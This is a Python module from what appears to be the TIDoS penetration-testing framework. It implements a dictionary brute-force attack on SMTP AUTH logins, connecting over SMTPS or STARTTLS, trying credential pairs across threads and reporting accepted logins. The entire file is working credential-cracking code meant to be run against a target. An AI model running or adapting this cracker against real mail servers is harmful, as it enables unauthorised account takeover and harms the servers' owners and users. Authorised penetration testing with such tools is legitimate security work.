#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#This module requires TIDoS Framework
#https://github.com/0xInfection/TIDoS-Framework

"""Dictionary brute force of SMTP AUTH (STARTTLS when offered, SMTPS on 465)."""

from __future__ import annotations

import smtplib

from core.methods import brute
from core.methods.print import pbrute

info = "Brute force SMTP AUTH credentials (STARTTLS when offered, SMTPS on 465)."
searchinfo = "SMTP Login Cracker"
properties = brute.options(port_default=587, threads_default=4)


def _try_login(ip, port, user, password, timeout):
    port = int(port)
    try:
        if port == 465:
            srv = smtplib.SMTP_SSL(ip, port, timeout=timeout)
        else:
            srv = smtplib.SMTP(ip, port, timeout=timeout)
    except Exception as e:
        raise ConnectionError(str(e)) from e
    try:
        srv.ehlo()
        if port != 465 and srv.has_extn("starttls"):
            srv.starttls()
            srv.ehlo()
        if not srv.has_extn("auth"):
            raise ConnectionError("server does not advertise AUTH")
        srv.login(user, password)
        return True
    except smtplib.SMTPAuthenticationError:
        return False            # credentials rejected
    except smtplib.SMTPException as e:
        # AUTH-not-supported / unexpected code -> transport-level problem
        raise ConnectionError(str(e)) from e
    except Exception as e:
        raise ConnectionError(str(e)) from e
    finally:
        try:
            srv.quit()
        except Exception:
            try:
                srv.close()
            except Exception:
                pass


def attack(target):
    pbrute("SMTP")
    return brute.run(target, properties, proto="smtp", port_default=587,
              try_login=_try_login, lvl2="smtpbrute", threads_default=4,
              service="SMTP")
